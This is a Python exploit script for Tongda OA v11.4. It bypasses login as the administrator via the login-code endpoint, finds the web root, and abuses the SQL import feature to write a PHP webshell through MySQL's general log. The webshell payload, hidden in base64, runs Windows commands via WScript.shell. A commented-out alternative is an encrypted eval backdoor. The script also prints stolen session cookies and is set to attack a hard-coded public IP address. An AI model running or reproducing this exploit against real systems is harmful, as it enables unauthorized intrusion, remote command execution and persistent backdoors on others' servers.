#! /usr/bin/env python3
# -*- coding: utf-8 -*-

'''
@  已测试通过版本： v11.4
@  https://www.github.com/zrools/tools/python
@  修改 oa_addr 后： python3 tongda_v11.4_rce_exp.py
'''

import requests, base64, re

session = requests.Session()

oa_addr = 'http://192.168.0.3:8080'

headers = {
        'Accept-Encoding' : 'gzip, deflate',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
    }


def login():
    login_url = '{}/logincheck_code.php'.format(oa_addr)
    login_code_url = '{}/general/login_code.php?codeuid=1'.format(oa_addr)
    
    login_headers = headers
    login_headers['X-Requested-With'] = 'XMLHttpRequest'
    login_headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    
    res = session.get(login_code_url)
    code_uid = res.text.strip()[-40:-2]

    login_data = 'UID=1&CODEUID={}'.format(code_uid)

    res = session.post(login_url, data=login_data, headers=login_headers)
        
    if '"status":1' in res.text:
        return True
    
    return False


def upload_file(web_path):
    upload_url = '{}/general/system/database/sql.php'.format(oa_addr)
    
    upload_data = base64.b64decode( 'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDc0OTk3Njg4MjE0NjY5MjYzOTIwNTI0OTEzNjINCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3FsX2ZpbGUiOyBmaWxlbmFtZT0iZXhwLnNxbCINCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC1zcWwNCg0Kc2V0IGdsb2JhbCBnZW5lcmFsX2xvZz0nb24nOwpzZXQgZ2xvYmFsIGdlbmVyYWxfbG9nX2ZpbGU9J01ZT0FfV0VCU0hFTEwnOwpzZWxlY3QgIjw/cGhwICRjb21tYW5kPSRfR0VUWydjbWQnXTskd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRleGVjID0gJHdzaC0+ZXhlYygnY21kIC9jICcuJGNvbW1hbmQpOyAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOyAkc3Ryb3V0cHV0ID0gJHN0ZG91dC0+UmVhZEFsbCgpO2VjaG8gJHN0cm91dHB1dDs/PiI7CnNldCBnbG9iYWwgZ2VuZXJhbF9sb2c9J29mZic7Cg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDc0OTk3Njg4MjE0NjY5MjYzOTIwNTI0OTEzNjItLQ==')
    
    #upload_data = base64.b64decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDc0OTk3Njg4MjE0NjY5MjYzOTIwNTI0OTEzNjIKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzcWxfZmlsZSI7IGZpbGVuYW1lPSJleHAuc3FsIgpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtc3FsCgpzZXQgZ2xvYmFsIGdlbmVyYWxfbG9nPSdvbic7CnNldCBnbG9iYWwgZ2VuZXJhbF9sb2dfZmlsZT0nTVlPQV9XRUJTSEVMTCc7CnNlbGVjdCAiPD9waHBAZXJyb3JfcmVwb3J0aW5nKDApO3Nlc3Npb25fc3RhcnQoKTtpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyl7ICAgICRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyRfU0VTU0lPTlsnayddPSRrZXk7JHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7aWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSl7JHQ9ImJhc2U2NF8iLiJkZWNvZGUiOyRwb3N0PSR0KCRwb3N0LiIiKTtmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAgICAgfX1lbHNleyRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpO30gICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7ICAgICRmdW5jPSRhcnJbMF07ICAgICRwYXJhbXM9JGFyclsxXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319ICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpO30/PiI7CnNldCBnbG9iYWwgZ2VuZXJhbF9sb2c9J29mZic7CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTIwNzQ5OTc2ODgyMTQ2NjkyNjM5MjA1MjQ5MTM2Mi0t')

    shell_path = '{}\\\\api\\\\test.php'.format(web_path)
    upload_data = upload_data.decode('utf8').replace('MYOA_WEBSHELL', shell_path).encode('utf8')
    
    upload_headers = headers
    upload_headers['Content-Type'] = 'multipart/form-data; boundary=---------------------------207499768821466926392052491362'
    
    res = session.post(upload_url, data=upload_data, headers=upload_headers)
    
    webshell = ''
    
    if '数据库脚本导入完成' in res.text:
        webshell = '{}/api/test.php?cmd=ipconfig'.format(oa_addr)

    return webshell


def get_path():
    url = '{}/general/system/security/service.php'.format(oa_addr)
    
    res = session.get(url, headers=headers)
    
    web_path = ''
    # 避免正则报错
    for i in res.text.split("\n"):
        if 'WEBROOT' in i:
            web_path = i.split('"')[-4]
    
    return web_path.replace('\\', '\\\\')


def check(**kwargs):

    try:

        global oa_addr
        oa_addr = kwargs['url']
        if not login():
            print('login failed.')
            return None
    
        web_path = get_path()
        print('webroot: ', web_path)
    
        cookies = ';'.join([k + '=' + v for k, v in session.cookies.items()])
        print('cookies: ', cookies)
    
        if web_path:
            webshell = upload_file(web_path)
            if webshell:
                print('webshell: (GET) {}'.format(webshell))
                return True
    
        print('getshell failed.')
        return None
    except Exception as e:
        print('%s 目标不存在漏洞'%oa_addr)


if __name__ == '__main__':
    check(**{'url':'http://220.166.20.253:8008'})